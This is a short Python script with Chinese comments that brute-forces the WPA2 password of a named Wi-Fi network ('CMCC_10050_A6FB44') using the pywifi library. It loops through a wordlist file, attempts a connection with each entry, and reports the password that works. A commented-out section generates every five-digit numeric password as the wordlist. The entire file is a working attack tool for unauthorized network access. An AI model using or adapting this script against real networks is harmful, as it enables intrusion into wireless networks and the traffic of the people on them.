import pywifi
from pywifi import const
import time
# import itertools as its
# #迭代器
# words="1234567890"
# #生成密码本的位数，五位数，repeat=5
# r=its.product(words,repeat=5)
# #保存在文件中，追加
# dic=open("password.txt","w")
# #i是元组
# for i in r:
#     #jion空格链接
#     dic.write("".join(i))
#     dic.write("".join("\n"))
#     # print(i)
# dic.close()
# print("密码本已生成")

def wifiConnect(pwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        #要连接wifi的名称
        profile.ssid = "CMCC_10050_A6FB44"#HONOR Play4T
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接！")

def readPassword():
    print("开始破解...")
    path = "password.txt"
    file = open(path,"r")
    while True:
        try:
            pad = file.readline()
            bool = wifiConnect(pad)
            if bool:
                print("密码已破解：",pad)
                print("wifi已自动连接！！！")
                break
            else:
                print("密码破解中...密码校对！",pad)
        except:
            continue
readPassword()

#思路是好的，但是密码本很不现实,需要一个巨大的密码本作为数据源